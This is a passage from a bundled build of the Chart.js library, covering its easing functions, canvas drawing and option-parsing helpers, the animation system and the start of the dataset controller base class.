   * @todo remove at version 3
   * @private
   */
  helpers.getValueAtIndexOrDefault = helpers.valueAtIndexOrDefault;

  /**
   * Easing functions adapted from Robert Penner's easing equations.
   * @namespace Chart.helpers.easingEffects
   * @see http://www.robertpenner.com/easing/
   */
  var effects = {
    linear: function (t) {
      return t;
    },

    easeInQuad: function (t) {
      return t * t;
    },

    easeOutQuad: function (t) {
      return -t * (t - 2);
    },

    easeInOutQuad: function (t) {
      if ((t /= 0.5) < 1) {
        return 0.5 * t * t;
      }
      return -0.5 * (--t * (t - 2) - 1);
    },

    easeInCubic: function (t) {
      return t * t * t;
    },

    easeOutCubic: function (t) {
      return (t = t - 1) * t * t + 1;
    },

    easeInOutCubic: function (t) {
      if ((t /= 0.5) < 1) {
        return 0.5 * t * t * t;
      }
      return 0.5 * ((t -= 2) * t * t + 2);
    },

    easeInQuart: function (t) {
      return t * t * t * t;
    },

    easeOutQuart: function (t) {
      return -((t = t - 1) * t * t * t - 1);
    },

    easeInOutQuart: function (t) {
      if ((t /= 0.5) < 1) {
        return 0.5 * t * t * t * t;
      }
      return -0.5 * ((t -= 2) * t * t * t - 2);
    },

    easeInQuint: function (t) {
      return t * t * t * t * t;
    },

    easeOutQuint: function (t) {
      return (t = t - 1) * t * t * t * t + 1;
    },

    easeInOutQuint: function (t) {
      if ((t /= 0.5) < 1) {
        return 0.5 * t * t * t * t * t;
      }
      return 0.5 * ((t -= 2) * t * t * t * t + 2);
    },

    easeInSine: function (t) {
      return -Math.cos(t * (Math.PI / 2)) + 1;
    },

    easeOutSine: function (t) {
      return Math.sin(t * (Math.PI / 2));
    },

    easeInOutSine: function (t) {
      return -0.5 * (Math.cos(Math.PI * t) - 1);
    },

    easeInExpo: function (t) {
      return t === 0 ? 0 : Math.pow(2, 10 * (t - 1));
    },

    easeOutExpo: function (t) {
      return t === 1 ? 1 : -Math.pow(2, -10 * t) + 1;
    },

    easeInOutExpo: function (t) {
      if (t === 0) {
        return 0;
      }
      if (t === 1) {
        return 1;
      }
      if ((t /= 0.5) < 1) {
        return 0.5 * Math.pow(2, 10 * (t - 1));
      }
      return 0.5 * (-Math.pow(2, -10 * --t) + 2);
    },

    easeInCirc: function (t) {
      if (t >= 1) {
        return t;
      }
      return -(Math.sqrt(1 - t * t) - 1);
    },

    easeOutCirc: function (t) {
      return Math.sqrt(1 - (t = t - 1) * t);
    },

    easeInOutCirc: function (t) {
      if ((t /= 0.5) < 1) {
        return -0.5 * (Math.sqrt(1 - t * t) - 1);
      }
      return 0.5 * (Math.sqrt(1 - (t -= 2) * t) + 1);
    },

    easeInElastic: function (t) {
      var s = 1.70158;
      var p = 0;
      var a = 1;
      if (t === 0) {
        return 0;
      }
      if (t === 1) {
        return 1;
      }
      if (!p) {
        p = 0.3;
      }
      if (a < 1) {
        a = 1;
        s = p / 4;
      } else {
        s = (p / (2 * Math.PI)) * Math.asin(1 / a);
      }
      return -(
        a *
        Math.pow(2, 10 * (t -= 1)) *
        Math.sin(((t - s) * (2 * Math.PI)) / p)
      );
    },

    easeOutElastic: function (t) {
      var s = 1.70158;
      var p = 0;
      var a = 1;
      if (t === 0) {
        return 0;
      }
      if (t === 1) {
        return 1;
      }
      if (!p) {
        p = 0.3;
      }
      if (a < 1) {
        a = 1;
        s = p / 4;
      } else {
        s = (p / (2 * Math.PI)) * Math.asin(1 / a);
      }
      return (
        a * Math.pow(2, -10 * t) * Math.sin(((t - s) * (2 * Math.PI)) / p) + 1
      );
    },

    easeInOutElastic: function (t) {
      var s = 1.70158;
      var p = 0;
      var a = 1;
      if (t === 0) {
        return 0;
      }
      if ((t /= 0.5) === 2) {
        return 1;
      }
      if (!p) {
        p = 0.45;
      }
      if (a < 1) {
        a = 1;
        s = p / 4;
      } else {
        s = (p / (2 * Math.PI)) * Math.asin(1 / a);
      }
      if (t < 1) {
        return (
          -0.5 *
          (a *
            Math.pow(2, 10 * (t -= 1)) *
            Math.sin(((t - s) * (2 * Math.PI)) / p))
        );
      }
      return (
        a *
          Math.pow(2, -10 * (t -= 1)) *
          Math.sin(((t - s) * (2 * Math.PI)) / p) *
          0.5 +
        1
      );
    },
    easeInBack: function (t) {
      var s = 1.70158;
      return t * t * ((s + 1) * t - s);
    },

    easeOutBack: function (t) {
      var s = 1.70158;
      return (t = t - 1) * t * ((s + 1) * t + s) + 1;
    },

    easeInOutBack: function (t) {
      var s = 1.70158;
      if ((t /= 0.5) < 1) {
        return 0.5 * (t * t * (((s *= 1.525) + 1) * t - s));
      }
      return 0.5 * ((t -= 2) * t * (((s *= 1.525) + 1) * t + s) + 2);
    },

    easeInBounce: function (t) {
      return 1 - effects.easeOutBounce(1 - t);
    },

    easeOutBounce: function (t) {
      if (t < 1 / 2.75) {
        return 7.5625 * t * t;
      }
      if (t < 2 / 2.75) {
        return 7.5625 * (t -= 1.5 / 2.75) * t + 0.75;
      }
      if (t < 2.5 / 2.75) {
        return 7.5625 * (t -= 2.25 / 2.75) * t + 0.9375;
      }
      return 7.5625 * (t -= 2.625 / 2.75) * t + 0.984375;
    },

    easeInOutBounce: function (t) {
      if (t < 0.5) {
        return effects.easeInBounce(t * 2) * 0.5;
      }
      return effects.easeOutBounce(t * 2 - 1) * 0.5 + 0.5;
    },
  };

  var helpers_easing = {
    effects: effects,
  };

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart.helpers.easing.effects instead.
   * @function Chart.helpers.easingEffects
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers_core.easingEffects = effects;

  var PI = Math.PI;
  var RAD_PER_DEG = PI / 180;
  var DOUBLE_PI = PI * 2;
  var HALF_PI = PI / 2;
  var QUARTER_PI = PI / 4;
  var TWO_THIRDS_PI = (PI * 2) / 3;

  /**
   * @namespace Chart.helpers.canvas
   */
  var exports$1 = {
    /**
     * Clears the entire canvas associated to the given `chart`.
     * @param {Chart} chart - The chart for which to clear the canvas.
     */
    clear: function (chart) {
      chart.ctx.clearRect(0, 0, chart.width, chart.height);
    },

    /**
     * Creates a "path" for a rectangle with rounded corners at position (x, y) with a
     * given size (width, height) and the same `radius` for all corners.
     * @param {CanvasRenderingContext2D} ctx - The canvas 2D Context.
     * @param {number} x - The x axis of the coordinate for the rectangle starting point.
     * @param {number} y - The y axis of the coordinate for the rectangle starting point.
     * @param {number} width - The rectangle's width.
     * @param {number} height - The rectangle's height.
     * @param {number} radius - The rounded amount (in pixels) for the four corners.
     * @todo handle `radius` as top-left, top-right, bottom-right, bottom-left array/object?
     */
    roundedRect: function (ctx, x, y, width, height, radius) {
      if (radius) {
        var r = Math.min(radius, height / 2, width / 2);
        var left = x + r;
        var top = y + r;
        var right = x + width - r;
        var bottom = y + height - r;

        ctx.moveTo(x, top);
        if (left < right && top < bottom) {
          ctx.arc(left, top, r, -PI, -HALF_PI);
          ctx.arc(right, top, r, -HALF_PI, 0);
          ctx.arc(right, bottom, r, 0, HALF_PI);
          ctx.arc(left, bottom, r, HALF_PI, PI);
        } else if (left < right) {
          ctx.moveTo(left, y);
          ctx.arc(right, top, r, -HALF_PI, HALF_PI);
          ctx.arc(left, top, r, HALF_PI, PI + HALF_PI);
        } else if (top < bottom) {
          ctx.arc(left, top, r, -PI, 0);
          ctx.arc(left, bottom, r, 0, PI);
        } else {
          ctx.arc(left, top, r, -PI, PI);
        }
        ctx.closePath();
        ctx.moveTo(x, y);
      } else {
        ctx.rect(x, y, width, height);
      }
    },

    drawPoint: function (ctx, style, radius, x, y, rotation) {
      var type, xOffset, yOffset, size, cornerRadius;
      var rad = (rotation || 0) * RAD_PER_DEG;

      if (style && typeof style === "object") {
        type = style.toString();
        if (
          type === "[object HTMLImageElement]" ||
          type === "[object HTMLCanvasElement]"
        ) {
          ctx.save();
          ctx.translate(x, y);
          ctx.rotate(rad);
          ctx.drawImage(
            style,
            -style.width / 2,
            -style.height / 2,
            style.width,
            style.height
          );
          ctx.restore();
          return;
        }
      }

      if (isNaN(radius) || radius <= 0) {
        return;
      }

      ctx.beginPath();

      switch (style) {
        // Default includes circle
        default:
          ctx.arc(x, y, radius, 0, DOUBLE_PI);
          ctx.closePath();
          break;
        case "triangle":
          ctx.moveTo(x + Math.sin(rad) * radius, y - Math.cos(rad) * radius);
          rad += TWO_THIRDS_PI;
          ctx.lineTo(x + Math.sin(rad) * radius, y - Math.cos(rad) * radius);
          rad += TWO_THIRDS_PI;
          ctx.lineTo(x + Math.sin(rad) * radius, y - Math.cos(rad) * radius);
          ctx.closePath();
          break;
        case "rectRounded":
          // NOTE: the rounded rect implementation changed to use `arc` instead of
          // `quadraticCurveTo` since it generates better results when rect is
          // almost a circle. 0.516 (instead of 0.5) produces results with visually
          // closer proportion to the previous impl and it is inscribed in the
          // circle with `radius`. For more details, see the following PRs:
          // https://github.com/chartjs/Chart.js/issues/5597
          // https://github.com/chartjs/Chart.js/issues/5858
          cornerRadius = radius * 0.516;
          size = radius - cornerRadius;
          xOffset = Math.cos(rad + QUARTER_PI) * size;
          yOffset = Math.sin(rad + QUARTER_PI) * size;
          ctx.arc(
            x - xOffset,
            y - yOffset,
            cornerRadius,
            rad - PI,
            rad - HALF_PI
          );
          ctx.arc(x + yOffset, y - xOffset, cornerRadius, rad - HALF_PI, rad);
          ctx.arc(x + xOffset, y + yOffset, cornerRadius, rad, rad + HALF_PI);
          ctx.arc(
            x - yOffset,
            y + xOffset,
            cornerRadius,
            rad + HALF_PI,
            rad + PI
          );
          ctx.closePath();
          break;
        case "rect":
          if (!rotation) {
            size = Math.SQRT1_2 * radius;
            ctx.rect(x - size, y - size, 2 * size, 2 * size);
            break;
          }
          rad += QUARTER_PI;
        /* falls through */
        case "rectRot":
          xOffset = Math.cos(rad) * radius;
          yOffset = Math.sin(rad) * radius;
          ctx.moveTo(x - xOffset, y - yOffset);
          ctx.lineTo(x + yOffset, y - xOffset);
          ctx.lineTo(x + xOffset, y + yOffset);
          ctx.lineTo(x - yOffset, y + xOffset);
          ctx.closePath();
          break;
        case "crossRot":
          rad += QUARTER_PI;
        /* falls through */
        case "cross":
          xOffset = Math.cos(rad) * radius;
          yOffset = Math.sin(rad) * radius;
          ctx.moveTo(x - xOffset, y - yOffset);
          ctx.lineTo(x + xOffset, y + yOffset);
          ctx.moveTo(x + yOffset, y - xOffset);
          ctx.lineTo(x - yOffset, y + xOffset);
          break;
        case "star":
          xOffset = Math.cos(rad) * radius;
          yOffset = Math.sin(rad) * radius;
          ctx.moveTo(x - xOffset, y - yOffset);
          ctx.lineTo(x + xOffset, y + yOffset);
          ctx.moveTo(x + yOffset, y - xOffset);
          ctx.lineTo(x - yOffset, y + xOffset);
          rad += QUARTER_PI;
          xOffset = Math.cos(rad) * radius;
          yOffset = Math.sin(rad) * radius;
          ctx.moveTo(x - xOffset, y - yOffset);
          ctx.lineTo(x + xOffset, y + yOffset);
          ctx.moveTo(x + yOffset, y - xOffset);
          ctx.lineTo(x - yOffset, y + xOffset);
          break;
        case "line":
          xOffset = Math.cos(rad) * radius;
          yOffset = Math.sin(rad) * radius;
          ctx.moveTo(x - xOffset, y - yOffset);
          ctx.lineTo(x + xOffset, y + yOffset);
          break;
        case "dash":
          ctx.moveTo(x, y);
          ctx.lineTo(x + Math.cos(rad) * radius, y + Math.sin(rad) * radius);
          break;
      }

      ctx.fill();
      ctx.stroke();
    },

    /**
     * Returns true if the point is inside the rectangle
     * @param {object} point - The point to test
     * @param {object} area - The rectangle
     * @returns {boolean}
     * @private
     */
    _isPointInArea: function (point, area) {
      var epsilon = 1e-6; // 1e-6 is margin in pixels for accumulated error.

      return (
        point.x > area.left - epsilon &&
        point.x < area.right + epsilon &&
        point.y > area.top - epsilon &&
        point.y < area.bottom + epsilon
      );
    },

    clipArea: function (ctx, area) {
      ctx.save();
      ctx.beginPath();
      ctx.rect(
        area.left,
        area.top,
        area.right - area.left,
        area.bottom - area.top
      );
      ctx.clip();
    },

    unclipArea: function (ctx) {
      ctx.restore();
    },

    lineTo: function (ctx, previous, target, flip) {
      var stepped = target.steppedLine;
      if (stepped) {
        if (stepped === "middle") {
          var midpoint = (previous.x + target.x) / 2.0;
          ctx.lineTo(midpoint, flip ? target.y : previous.y);
          ctx.lineTo(midpoint, flip ? previous.y : target.y);
        } else if (
          (stepped === "after" && !flip) ||
          (stepped !== "after" && flip)
        ) {
          ctx.lineTo(previous.x, target.y);
        } else {
          ctx.lineTo(target.x, previous.y);
        }
        ctx.lineTo(target.x, target.y);
        return;
      }

      if (!target.tension) {
        ctx.lineTo(target.x, target.y);
        return;
      }

      ctx.bezierCurveTo(
        flip ? previous.controlPointPreviousX : previous.controlPointNextX,
        flip ? previous.controlPointPreviousY : previous.controlPointNextY,
        flip ? target.controlPointNextX : target.controlPointPreviousX,
        flip ? target.controlPointNextY : target.controlPointPreviousY,
        target.x,
        target.y
      );
    },
  };

  var helpers_canvas = exports$1;

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart.helpers.canvas.clear instead.
   * @namespace Chart.helpers.clear
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers_core.clear = exports$1.clear;

  /**
   * Provided for backward compatibility, use Chart.helpers.canvas.roundedRect instead.
   * @namespace Chart.helpers.drawRoundedRectangle
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers_core.drawRoundedRectangle = function (ctx) {
    ctx.beginPath();
    exports$1.roundedRect.apply(exports$1, arguments);
  };

  var defaults = {
    /**
     * @private
     */
    _set: function (scope, values) {
      return helpers_core.merge(this[scope] || (this[scope] = {}), values);
    },
  };

  // TODO(v3): remove 'global' from namespace.  all default are global and
  // there's inconsistency around which options are under 'global'
  defaults._set("global", {
    defaultColor: "rgba(0,0,0,0.1)",
    defaultFontColor: "#666",
    defaultFontFamily: "'Helvetica Neue', 'Helvetica', 'Arial', sans-serif",
    defaultFontSize: 12,
    defaultFontStyle: "normal",
    defaultLineHeight: 1.2,
    showLines: true,
  });

  var core_defaults = defaults;

  var valueOrDefault = helpers_core.valueOrDefault;

  /**
   * Converts the given font object into a CSS font string.
   * @param {object} font - A font object.
   * @return {string} The CSS font string. See https://developer.mozilla.org/en-US/docs/Web/CSS/font
   * @private
   */
  function toFontString(font) {
    if (
      !font ||
      helpers_core.isNullOrUndef(font.size) ||
      helpers_core.isNullOrUndef(font.family)
    ) {
      return null;
    }

    return (
      (font.style ? font.style + " " : "") +
      (font.weight ? font.weight + " " : "") +
      font.size +
      "px " +
      font.family
    );
  }

  /**
   * @alias Chart.helpers.options
   * @namespace
   */
  var helpers_options = {
    /**
     * Converts the given line height `value` in pixels for a specific font `size`.
     * @param {number|string} value - The lineHeight to parse (eg. 1.6, '14px', '75%', '1.6em').
     * @param {number} size - The font size (in pixels) used to resolve relative `value`.
     * @returns {number} The effective line height in pixels (size * 1.2 if value is invalid).
     * @see https://developer.mozilla.org/en-US/docs/Web/CSS/line-height
     * @since 2.7.0
     */
    toLineHeight: function (value, size) {
      var matches = ("" + value).match(/^(normal|(\d+(?:\.\d+)?)(px|em|%)?)$/);
      if (!matches || matches[1] === "normal") {
        return size * 1.2;
      }

      value = +matches[2];

      switch (matches[3]) {
        case "px":
          return value;
        case "%":
          value /= 100;
          break;
      }

      return size * value;
    },

    /**
     * Converts the given value into a padding object with pre-computed width/height.
     * @param {number|object} value - If a number, set the value to all TRBL component,
     *  else, if and object, use defined properties and sets undefined ones to 0.
     * @returns {object} The padding values (top, right, bottom, left, width, height)
     * @since 2.7.0
     */
    toPadding: function (value) {
      var t, r, b, l;

      if (helpers_core.isObject(value)) {
        t = +value.top || 0;
        r = +value.right || 0;
        b = +value.bottom || 0;
        l = +value.left || 0;
      } else {
        t = r = b = l = +value || 0;
      }

      return {
        top: t,
        right: r,
        bottom: b,
        left: l,
        height: t + b,
        width: l + r,
      };
    },

    /**
     * Parses font options and returns the font object.
     * @param {object} options - A object that contains font options to be parsed.
     * @return {object} The font object.
     * @todo Support font.* options and renamed to toFont().
     * @private
     */
    _parseFont: function (options) {
      var globalDefaults = core_defaults.global;
      var size = valueOrDefault(
        options.fontSize,
        globalDefaults.defaultFontSize
      );
      var font = {
        family: valueOrDefault(
          options.fontFamily,
          globalDefaults.defaultFontFamily
        ),
        lineHeight: helpers_core.options.toLineHeight(
          valueOrDefault(options.lineHeight, globalDefaults.defaultLineHeight),
          size
        ),
        size: size,
        style: valueOrDefault(
          options.fontStyle,
          globalDefaults.defaultFontStyle
        ),
        weight: null,
        string: "",
      };

      font.string = toFontString(font);
      return font;
    },

    /**
     * Evaluates the given `inputs` sequentially and returns the first defined value.
     * @param {Array} inputs - An array of values, falling back to the last value.
     * @param {object} [context] - If defined and the current value is a function, the value
     * is called with `context` as first argument and the result becomes the new input.
     * @param {number} [index] - If defined and the current value is an array, the value
     * at `index` become the new input.
     * @param {object} [info] - object to return information about resolution in
     * @param {boolean} [info.cacheable] - Will be set to `false` if option is not cacheable.
     * @since 2.7.0
     */
    resolve: function (inputs, context, index, info) {
      var cacheable = true;
      var i, ilen, value;

      for (i = 0, ilen = inputs.length; i < ilen; ++i) {
        value = inputs[i];
        if (value === undefined) {
          continue;
        }
        if (context !== undefined && typeof value === "function") {
          value = value(context);
          cacheable = false;
        }
        if (index !== undefined && helpers_core.isArray(value)) {
          value = value[index];
          cacheable = false;
        }
        if (value !== undefined) {
          if (info && !cacheable) {
            info.cacheable = false;
          }
          return value;
        }
      }
    },
  };

  /**
   * @alias Chart.helpers.math
   * @namespace
   */
  var exports$2 = {
    /**
     * Returns an array of factors sorted from 1 to sqrt(value)
     * @private
     */
    _factorize: function (value) {
      var result = [];
      var sqrt = Math.sqrt(value);
      var i;

      for (i = 1; i < sqrt; i++) {
        if (value % i === 0) {
          result.push(i);
          result.push(value / i);
        }
      }
      if (sqrt === (sqrt | 0)) {
        // if value is a square number
        result.push(sqrt);
      }

      result
        .sort(function (a, b) {
          return a - b;
        })
        .pop();
      return result;
    },

    log10:
      Math.log10 ||
      function (x) {
        var exponent = Math.log(x) * Math.LOG10E; // Math.LOG10E = 1 / Math.LN10.
        // Check for whole powers of 10,
        // which due to floating point rounding error should be corrected.
        var powerOf10 = Math.round(exponent);
        var isPowerOf10 = x === Math.pow(10, powerOf10);

        return isPowerOf10 ? powerOf10 : exponent;
      },
  };

  var helpers_math = exports$2;

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart.helpers.math.log10 instead.
   * @namespace Chart.helpers.log10
   * @deprecated since version 2.9.0
   * @todo remove at version 3
   * @private
   */
  helpers_core.log10 = exports$2.log10;

  var getRtlAdapter = function (rectX, width) {
    return {
      x: function (x) {
        return rectX + rectX + width - x;
      },
      setWidth: function (w) {
        width = w;
      },
      textAlign: function (align) {
        if (align === "center") {
          return align;
        }
        return align === "right" ? "left" : "right";
      },
      xPlus: function (x, value) {
        return x - value;
      },
      leftForLtr: function (x, itemWidth) {
        return x - itemWidth;
      },
    };
  };

  var getLtrAdapter = function () {
    return {
      x: function (x) {
        return x;
      },
      setWidth: function (w) {
        // eslint-disable-line no-unused-vars
      },
      textAlign: function (align) {
        return align;
      },
      xPlus: function (x, value) {
        return x + value;
      },
      leftForLtr: function (x, _itemWidth) {
        // eslint-disable-line no-unused-vars
        return x;
      },
    };
  };

  var getAdapter = function (rtl, rectX, width) {
    return rtl ? getRtlAdapter(rectX, width) : getLtrAdapter();
  };

  var overrideTextDirection = function (ctx, direction) {
    var style, original;
    if (direction === "ltr" || direction === "rtl") {
      style = ctx.canvas.style;
      original = [
        style.getPropertyValue("direction"),
        style.getPropertyPriority("direction"),
      ];

      style.setProperty("direction", direction, "important");
      ctx.prevTextDirection = original;
    }
  };

  var restoreTextDirection = function (ctx) {
    var original = ctx.prevTextDirection;
    if (original !== undefined) {
      delete ctx.prevTextDirection;
      ctx.canvas.style.setProperty("direction", original[0], original[1]);
    }
  };

  var helpers_rtl = {
    getRtlAdapter: getAdapter,
    overrideTextDirection: overrideTextDirection,
    restoreTextDirection: restoreTextDirection,
  };

  var helpers$1 = helpers_core;
  var easing = helpers_easing;
  var canvas = helpers_canvas;
  var options = helpers_options;
  var math = helpers_math;
  var rtl = helpers_rtl;
  helpers$1.easing = easing;
  helpers$1.canvas = canvas;
  helpers$1.options = options;
  helpers$1.math = math;
  helpers$1.rtl = rtl;

  function interpolate(start, view, model, ease) {
    var keys = Object.keys(model);
    var i, ilen, key, actual, origin, target, type, c0, c1;

    for (i = 0, ilen = keys.length; i < ilen; ++i) {
      key = keys[i];

      target = model[key];

      // if a value is added to the model after pivot() has been called, the view
      // doesn't contain it, so let's initialize the view to the target value.
      if (!view.hasOwnProperty(key)) {
        view[key] = target;
      }

      actual = view[key];

      if (actual === target || key[0] === "_") {
        continue;
      }

      if (!start.hasOwnProperty(key)) {
        start[key] = actual;
      }

      origin = start[key];

      type = typeof target;

      if (type === typeof origin) {
        if (type === "string") {
          c0 = chartjsColor(origin);
          if (c0.valid) {
            c1 = chartjsColor(target);
            if (c1.valid) {
              view[key] = c1.mix(c0, ease).rgbString();
              continue;
            }
          }
        } else if (helpers$1.isFinite(origin) && helpers$1.isFinite(target)) {
          view[key] = origin + (target - origin) * ease;
          continue;
        }
      }

      view[key] = target;
    }
  }

  var Element = function (configuration) {
    helpers$1.extend(this, configuration);
    this.initialize.apply(this, arguments);
  };

  helpers$1.extend(Element.prototype, {
    _type: undefined,

    initialize: function () {
      this.hidden = false;
    },

    pivot: function () {
      var me = this;
      if (!me._view) {
        me._view = helpers$1.extend({}, me._model);
      }
      me._start = {};
      return me;
    },

    transition: function (ease) {
      var me = this;
      var model = me._model;
      var start = me._start;
      var view = me._view;

      // No animation -> No Transition
      if (!model || ease === 1) {
        me._view = helpers$1.extend({}, model);
        me._start = null;
        return me;
      }

      if (!view) {
        view = me._view = {};
      }

      if (!start) {
        start = me._start = {};
      }

      interpolate(start, view, model, ease);

      return me;
    },

    tooltipPosition: function () {
      return {
        x: this._model.x,
        y: this._model.y,
      };
    },

    hasValue: function () {
      return (
        helpers$1.isNumber(this._model.x) && helpers$1.isNumber(this._model.y)
      );
    },
  });

  Element.extend = helpers$1.inherits;

  var core_element = Element;

  var exports$3 = core_element.extend({
    chart: null, // the animation associated chart instance
    currentStep: 0, // the current animation step
    numSteps: 60, // default number of steps
    easing: "", // the easing to use for this animation
    render: null, // render function used by the animation service

    onAnimationProgress: null, // user specified callback to fire on each step of the animation
    onAnimationComplete: null, // user specified callback to fire when the animation finishes
  });

  var core_animation = exports$3;

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use Chart.Animation instead
   * @prop Chart.Animation#animationObject
   * @deprecated since version 2.6.0
   * @todo remove at version 3
   */
  Object.defineProperty(exports$3.prototype, "animationObject", {
    get: function () {
      return this;
    },
  });

  /**
   * Provided for backward compatibility, use Chart.Animation#chart instead
   * @prop Chart.Animation#chartInstance
   * @deprecated since version 2.6.0
   * @todo remove at version 3
   */
  Object.defineProperty(exports$3.prototype, "chartInstance", {
    get: function () {
      return this.chart;
    },
    set: function (value) {
      this.chart = value;
    },
  });

  core_defaults._set("global", {
    animation: {
      duration: 1000,
      easing: "easeOutQuart",
      onProgress: helpers$1.noop,
      onComplete: helpers$1.noop,
    },
  });

  var core_animations = {
    animations: [],
    request: null,

    /**
     * @param {Chart} chart - The chart to animate.
     * @param {Chart.Animation} animation - The animation that we will animate.
     * @param {number} duration - The animation duration in ms.
     * @param {boolean} lazy - if true, the chart is not marked as animating to enable more responsive interactions
     */
    addAnimation: function (chart, animation, duration, lazy) {
      var animations = this.animations;
      var i, ilen;

      animation.chart = chart;
      animation.startTime = Date.now();
      animation.duration = duration;

      if (!lazy) {
        chart.animating = true;
      }

      for (i = 0, ilen = animations.length; i < ilen; ++i) {
        if (animations[i].chart === chart) {
          animations[i] = animation;
          return;
        }
      }

      animations.push(animation);

      // If there are no animations queued, manually kickstart a digest, for lack of a better word
      if (animations.length === 1) {
        this.requestAnimationFrame();
      }
    },

    cancelAnimation: function (chart) {
      var index = helpers$1.findIndex(this.animations, function (animation) {
        return animation.chart === chart;
      });

      if (index !== -1) {
        this.animations.splice(index, 1);
        chart.animating = false;
      }
    },

    requestAnimationFrame: function () {
      var me = this;
      if (me.request === null) {
        // Skip animation frame requests until the active one is executed.
        // This can happen when processing mouse events, e.g. 'mousemove'
        // and 'mouseout' events will trigger multiple renders.
        me.request = helpers$1.requestAnimFrame.call(window, function () {
          me.request = null;
          me.startDigest();
        });
      }
    },

    /**
     * @private
     */
    startDigest: function () {
      var me = this;

      me.advance();

      // Do we have more stuff to animate?
      if (me.animations.length > 0) {
        me.requestAnimationFrame();
      }
    },

    /**
     * @private
     */
    advance: function () {
      var animations = this.animations;
      var animation, chart, numSteps, nextStep;
      var i = 0;

      // 1 animation per chart, so we are looping charts here
      while (i < animations.length) {
        animation = animations[i];
        chart = animation.chart;
        numSteps = animation.numSteps;

        // Make sure that currentStep starts at 1
        // https://github.com/chartjs/Chart.js/issues/6104
        nextStep =
          Math.floor(
            ((Date.now() - animation.startTime) / animation.duration) * numSteps
          ) + 1;
        animation.currentStep = Math.min(nextStep, numSteps);

        helpers$1.callback(animation.render, [chart, animation], chart);
        helpers$1.callback(animation.onAnimationProgress, [animation], chart);

        if (animation.currentStep >= numSteps) {
          helpers$1.callback(animation.onAnimationComplete, [animation], chart);
          chart.animating = false;
          animations.splice(i, 1);
        } else {
          ++i;
        }
      }
    },
  };

  var resolve = helpers$1.options.resolve;

  var arrayEvents = ["push", "pop", "shift", "splice", "unshift"];

  /**
   * Hooks the array methods that add or remove values ('push', pop', 'shift', 'splice',
   * 'unshift') and notify the listener AFTER the array has been altered. Listeners are
   * called on the 'onData*' callbacks (e.g. onDataPush, etc.) with same arguments.
   */
  function listenArrayEvents(array, listener) {
    if (array._chartjs) {
      array._chartjs.listeners.push(listener);
      return;
    }

    Object.defineProperty(array, "_chartjs", {
      configurable: true,
      enumerable: false,
      value: {
        listeners: [listener],
      },
    });

    arrayEvents.forEach(function (key) {
      var method = "onData" + key.charAt(0).toUpperCase() + key.slice(1);
      var base = array[key];

      Object.defineProperty(array, key, {
        configurable: true,
        enumerable: false,
        value: function () {
          var args = Array.prototype.slice.call(arguments);
          var res = base.apply(this, args);

          helpers$1.each(array._chartjs.listeners, function (object) {
            if (typeof object[method] === "function") {
              object[method].apply(object, args);
            }
          });

          return res;
        },
      });
    });
  }

  /**
   * Removes the given array event listener and cleanup extra attached properties (such as
   * the _chartjs stub and overridden methods) if array doesn't have any more listeners.
   */
  function unlistenArrayEvents(array, listener) {
    var stub = array._chartjs;
    if (!stub) {
      return;
    }

    var listeners = stub.listeners;
    var index = listeners.indexOf(listener);
    if (index !== -1) {
      listeners.splice(index, 1);
    }

    if (listeners.length > 0) {
      return;
    }

    arrayEvents.forEach(function (key) {
      delete array[key];
    });

    delete array._chartjs;
  }

  // Base class for all dataset controllers (line, bar, etc)
  var DatasetController = function (chart, datasetIndex) {
    this.initialize(chart, datasetIndex);
  };

  helpers$1.extend(DatasetController.prototype, {
    /**
     * Element type used to generate a meta dataset (e.g. Chart.element.Line).
     * @type {Chart.core.element}
     */
    datasetElementType: null,

    /**
     * Element type used to generate a meta data (e.g. Chart.element.Point).
     * @type {Chart.core.element}
     */
    dataElementType: null,

    /**
     * Dataset element option keys to be resolved in _resolveDatasetElementOptions.
     * A derived controller may override this to resolve controller-specific options.
     * The keys defined here are for backward compatibility for legend styles.
     * @private
     */
    _datasetElementOptions: [
      "backgroundColor",
      "borderCapStyle",
      "borderColor",
      "borderDash",
      "borderDashOffset",
      "borderJoinStyle",
      "borderWidth",
    ],

    /**
     * Data element option keys to be resolved in _resolveDataElementOptions.
     * A derived controller may override this to resolve controller-specific options.
     * The keys defined here are for backward compatibility for legend styles.
     * @private
     */
    _dataElementOptions: [
      "backgroundColor",
      "borderColor",
      "borderWidth",
      "pointStyle",
    ],

    initialize: function (chart, datasetIndex) {
      var me = this;
      me.chart = chart;
      me.index = datasetIndex;
      me.linkScales();
      me.addElements();
      me._type = me.getMeta().type;
    },

    updateIndex: function (datasetIndex) {
      this.index = datasetIndex;
    },

    linkScales: function () {
      var me = this;
      var meta = me.getMeta();
      var chart = me.chart;
      var scales = chart.scales;
      var dataset = me.getDataset();
      var scalesOpts = chart.options.scales;

      if (
        meta.xAxisID === null ||
        !(meta.xAxisID in scales) ||
        dataset.xAxisID
      ) {
        meta.xAxisID = dataset.xAxisID || scalesOpts.xAxes[0].id;
      }
      if (
        meta.yAxisID === null ||
        !(meta.yAxisID in scales) ||
        dataset.yAxisID
      ) {
        meta.yAxisID = dataset.yAxisID || scalesOpts.yAxes[0].id;
      }
    },

    getDataset: function () {
      return this.chart.data.datasets[this.index];
    },

    getMeta: function () {
      return this.chart.getDatasetMeta(this.index);
    },

    getScaleForId: function (scaleID) {
      return this.chart.scales[scaleID];
    },

    /**
     * @private
     */
    _getValueScaleId: function () {
      return this.getMeta().yAxisID;
    },

    /**
     * @private
     */
    _getIndexScaleId: function () {
      return this.getMeta().xAxisID;
    },

    /**
     * @private
     */
    _getValueScale: function () {
      return this.getScaleForId(this._getValueScaleId());
    },

    /**
     * @private
     */
    _getIndexScale: function () {
      return this.getScaleForId(this._getIndexScaleId());
    },

    reset: function () {
      this._update(true);
    },

    /**
     * @private
     */
    destroy: function () {
      if (this._data) {
        unlistenArrayEvents(this._data, this);
      }
    },

    createMetaDataset: function () {
      var me = this;
      var type = me.datasetElementType;
      return (
        type &&
        new type({
          _chart: me.chart,
          _datasetIndex: me.index,
        })
      );
    },

    createMetaData: function (index) {
      var me = this;
      var type = me.dataElementType;
      return (
        type &&
        new type({
          _chart: me.chart,
          _datasetIndex: me.index,
          _index: index,
        })
      );
    },

    addElements: function () {
      var me = this;
